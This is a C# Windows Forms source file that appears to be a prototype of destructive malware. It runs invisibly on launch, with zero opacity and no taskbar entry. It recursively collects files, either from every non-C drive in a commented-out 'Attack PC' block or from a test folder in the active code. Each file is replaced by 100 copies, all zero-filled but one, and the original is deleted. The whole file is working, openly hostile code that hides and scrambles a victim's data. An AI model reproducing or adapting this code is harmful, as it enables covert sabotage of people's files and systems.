using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Threading;
using System.Diagnostics;

namespace hodo
{
    public partial class Form1 : Form
    {
        BackgroundWorker m_oWorker;
        public Form1()
        {
            InitializeComponent();
            m_oWorker = new BackgroundWorker();
            m_oWorker.DoWork += new DoWorkEventHandler(m_oWorker_DoWork);
          
        }
        void m_oWorker_DoWork(object sender, DoWorkEventArgs e)
        {
            //Attack PC Start
            //List<string> list = new List<string>();
            //foreach (DriveInfo f in DriveInfo.GetDrives())
            //{
            //    if (f.ToString() != @"C:\")
            //    {
            //        list = DirSearch(f.ToString());
            //    }
            //}
            //foreach (string item in list)
            //{
            //    WriteFiles(item);
            //}
            // End
            // Test Code
            List<string> list = DirSearch(@"F:\TestFolder");
            foreach (string item in list)
            {
                WriteFiles(item);
            }
            //End
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            Form form = (Form)sender;
            form.ShowInTaskbar = false;
            form.Opacity = 0;
            m_oWorker.RunWorkerAsync();
           
        }
        private List<String> DirSearch(string sDir)
        {
            List<String> files = new List<String>();
            try
            {
                foreach (string f in Directory.GetFiles(sDir))
                {
                    files.Add(f);
                }
                foreach (string d in Directory.GetDirectories(sDir))
                {
                    files.AddRange(DirSearch(d));
                }
            }
            catch (System.Exception excpt)
            {
               // MessageBox.Show(excpt.Message);
            }

            return files;
        }
        private void button1_Click(object sender, EventArgs e)
        {
            m_oWorker.RunWorkerAsync();
        }
        public int RandomNumber(int min, int max)
        {
            Random random = new Random();
            return random.Next(min, max);
        }
        public void WriteFiles(string FilePath)
        {
            string filename = Path.GetFileNameWithoutExtension(FilePath);
            string Extension = Path.GetExtension(FilePath);
            string dir = GetPath(FilePath) + @"\";
            int max = 100; int min = 1; int ran = RandomNumber(min, max);
            long length = new System.IO.FileInfo(FilePath).Length;
            for (int i = 0; i < max; i++)
            {
                if (ran == i)
                {
                    System.IO.File.Copy(FilePath, dir + filename+ i + Extension, true);
                }
                else
                {
                    System.IO.File.WriteAllBytes(dir + filename + i + Extension, new byte[length]);
                }
            }
            File.Delete(FilePath);
            MessageBox.Show(ran.ToString());
        }
        public string GetPath(string filePath)
        {
            return Path.GetDirectoryName(Path.GetFullPath(filePath));
        }   

    }
}
